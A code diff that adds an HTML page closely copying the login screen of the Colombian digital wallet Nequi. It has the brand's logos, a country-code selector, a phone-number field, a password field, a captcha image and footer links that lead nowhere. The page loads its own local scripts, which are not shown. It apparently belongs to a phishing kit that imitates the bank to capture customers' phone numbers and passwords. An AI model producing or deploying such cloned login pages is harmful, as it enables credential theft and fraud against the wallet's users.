@@ -1,0 +1,158 @@
+<html>
+    <head>
+        <title>Nequi</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        
+        <meta content="es" http-equiv="Content-Language">
+    
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="shortcut icon" type="image/x-icon" href="../assets/img/favicon.ico">
+        <script type="text/javascript" src="../assets/js/jquery-3.6.0.min.js"></script>      
+        <link href="../assets/css/styles.css" rel="stylesheet">
+        <link href="../assets/css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="../assets/js/functions.js"></script>  
+    </head>
+    <body>        
+       <div class="cabecera">
+           <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
+                <tr>
+                    <td valign="middle" align="left"><img src="../assets/img/logo.svg" width="130"></td>
+                    <td valign="middle" align="right">
+                        <button class="btn btn-std btn-sprd top-btn">Recarga</button>
+                        <button class="btn btn-std btn-sprd top-btn">Entrar</button>
+                        <img src="../assets/img/menu.jpg" id="btn-menu">
+                    </td>
+                </tr>               
+           </table>
+       </div>
+        <div class="contenido-login">
+            <div class="titulo">Entra a tu Nequi</div>
+            <div class="descripcion" style="margin-top: 13px;">Podrás bloquear tu Nequi y consultar tus datos.</div>
+            <table border="0" cellpadding="0" cellspacing="6" style="margin:36px auto 4px auto; max-width: 362px;" width="94%">
+                <tr>
+                    <td width="106">
+                        <div id="indicativo">
+                            <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                <tr>
+                                    <td valign="middle" align="left"><img src="../assets/img/col.png" width="29" id="bandera"></td>
+                                    <td valign="middle" align="right" id="txt-indicativo">+57</td>
+                                    <td valign="middle" align="right"><img src="../assets/img/abajo.jpg" id="flecha">
+                                    </td>
+                                </tr>
+                            </table>
+                        </div>
+                        <div id="menu-indicativo">
+                            <div class="item-indicativo">
+                                <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                    <tr>
+                                        <td valign="middle" align="left"><img src="../assets/img/col.png" width="29"></td>
+                                        <td valign="middle" align="right" class="con-indicativo" style="color: #fff;">+57</td>
+                                        <td valign="middle" align="right"><div style="width: 11px;"></div>
+                                        </td>
+                                    </tr>
+                                </table>
+                            </div>
+                            <div class="item-indicativo">
+                                <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                    <tr>
+                                        <td valign="middle" align="left"><img src="../assets/img/pan.png" width="29"></td>
+                                        <td valign="middle" align="right" class="con-indicativo" style="color: #fff;">+507</td>
+                                        <td valign="middle" align="right"><div style="width: 11px;"></div>
+                                        </td>
+                                    </tr>
+                                </table>
+                            </div>
+                        </div>
+                    </td>
+                    <td><input type="text" name="txt-celular" id="txt-celular" class="entradas" placeholder="Celular" maxlength="10" style="border-radius: 0px 2px 2px 0px !important;" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"></td>
+                </tr>
+                <tr>
+                    <td colspan="2"><input type="password" name="txt-password" id="txt-password" placeholder="Contraseña" class="entradas"></td>
+                </tr>    
+            </table>
+
+            <img src="../assets/img/capcha-off.png" id="capcha" style="margin-bottom: 33px;">
+            <br>
+            <button id="btn-login" class="btn-big btn-fill" disabled>Entra</button>
+       </div>
+       <div class="pie">
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
+                <tr>
+                    <td id="logo-blanco-movil">
+                        <img src="../assets/img/logo-blanco.svg" width="176" style="margin-bottom: 27px;" >
+                        <div class="separador"></div>
+                    </td>
+                </tr>
+            </table>
+
+           
+
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">                
+                <tr>
+                    <td valign="top" id="logo-blanco">
+                        <img src="../assets/img/logo-blanco.svg" width="176">
+                    </td>
+                    <td valign="top">
+                        <div class="titulo-footer">Producto</div>
+                        <div class="item-footer">Legales</div>
+                        <div class="item-footer">Ayuda</div>
+
+                        <div class="titulo-footer vmovil">Portales</div>
+                        <div class="item-footer vmovil">Blog | Metidas de plata</div>
+                        <div class="item-footer vmovil">APIs | Nequi conecta</div>
+
+                        <div class="titulo-footer vmovil">Redes</div>
+                        <img class="vmovil" src="../assets/img/icon-social.jpg" style="margin-top: 10px;">
+
+                    </td>
+                    <td valign="top" id="app">
+                        <div class="titulo-footer">Descarga la App</div>
+                        <img src="../assets/img/icon-app.jpg" style="margin-top: 10px;">
+                    </td>
+                    <td valign="top" class="mmovil">
+                        <div class="titulo-footer">Portales</div>
+                        <div class="item-footer">Blog | Metidas de plata</div>
+                        <div class="item-footer">APIs | Nequi conecta</div>
+                    </td>
+                    <td valign="top" class="mmovil">
+                        <div class="titulo-footer">Redes</div>
+                        <img src="../assets/img/icon-social.jpg" style="margin-top: 10px;">
+                    </td>
+                </tr>                
+            </table>
+
+            
+
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">                                
+                <tr>
+                    <td id="gb-sec">
+                        <div class="separador"></div>                    
+                        <img src="../assets/img/gb-blanco.svg" width="122"  style="margin-bottom: 15px;">
+                        <div style="border-bottom: 1px solid red; width:100%;"></div>
+                    </td>
+                </tr>
+                <tr>
+                    <td valign="middle" align="center">
+                        <table border="0" cellpadding="0" cellspacing="0" >
+                            <tr>
+                                <td id="copy-menu">
+                                    <div class="item-copy">Características del producto</div>
+                                    <div class="item-copy">Condiciones de uso</div>
+                                    <div class="item-copy">Legales</div>
+                                    <div class="item-copy">Términos y condiciones</div>
+                                </td>    
+                            </tr>                            
+                        </table>                        
+                    </td>
+                </tr>
+            </table>
+
+       </div> 
+    </body>
+    <script type="text/javascript" src="../assets/js/ready.js"></script> 
+</html>
